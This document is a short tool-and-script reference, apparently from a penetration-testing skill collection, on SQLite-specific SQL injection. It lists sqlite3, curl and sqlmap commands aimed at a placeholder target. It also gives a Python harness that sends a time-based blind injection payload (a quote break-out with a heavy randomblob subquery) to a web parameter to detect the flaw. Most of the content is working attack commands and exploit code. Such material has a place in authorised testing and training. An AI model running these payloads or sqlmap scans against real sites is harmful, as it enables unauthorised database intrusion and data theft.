# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`sql-injection-sqlite-variants`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `sqlite3` | `sqlite3 app.db "SELECT name FROM sqlite_master WHERE type='table';"` | Enumerate tables through sqlite_master to confirm the SQLite dialect and schema surface | Linux, macOS, Windows |
| `curl` | `curl -sS -o /dev/null -w '%{http_code} %{time_total}\n' 'https://target.example/items?name=widget'` | Record the small SQLite baseline latency so a heavy-query delay is visible | Cross-platform |
| `sqlmap` | `sqlmap -u 'https://target.example/items?name=widget' --dbms=sqlite --technique=BEU --level=2 --batch` | Scope confirmation to SQLite boolean, error, and UNION techniques without file primitives | Linux, Windows, macOS |

## Minimal Script Shape

A heavy-query timing harness: it compares a light value against a nested randomblob variant, taking the minimum of repeated runs to separate the CPU-bound delay from jitter.

```python
import time
import urllib.parse
import urllib.request

BASE = "https://target.example/items"

def elapsed(name_value):
    url = BASE + "?" + urllib.parse.urlencode({"name": name_value})
    start = time.perf_counter()
    with urllib.request.urlopen(url, timeout=30) as r:
        r.read()
    return time.perf_counter() - start

light = min(elapsed("widget") for _ in range(3))
heavy = min(elapsed("widget' AND 1=(SELECT 1 WHERE randomblob(10000000) IS NOT NULL) --") for _ in range(3))
print({"light_s": round(light, 2), "heavy_s": round(heavy, 2),
       "heavy_query_delay": heavy - light > 1.0})
```
